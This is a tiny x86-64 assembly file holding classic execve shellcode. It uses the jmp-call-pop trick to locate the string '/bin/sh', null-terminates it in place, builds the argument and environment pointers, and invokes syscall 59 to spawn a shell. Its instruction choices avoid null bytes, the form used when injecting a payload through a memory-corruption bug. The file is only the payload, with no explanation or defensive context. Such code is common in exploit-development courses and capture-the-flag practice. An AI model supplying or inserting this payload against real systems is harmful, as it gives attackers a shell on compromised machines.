section .text
global _start
_start:

	jmp getstr
runtime:
	pop rdi
	xor rax, rax
	mov [rdi+7], byte ah
	mov [rdi+8], rdi
	mov [rdi+16], rax
	lea rsi, [rdi+8]
	lea rdx, [rdi+16]
	add al, 59
	syscall


getstr:
	call runtime
	prog: 	db	"/bin/shABBBBBBBBCCCCCCCC"

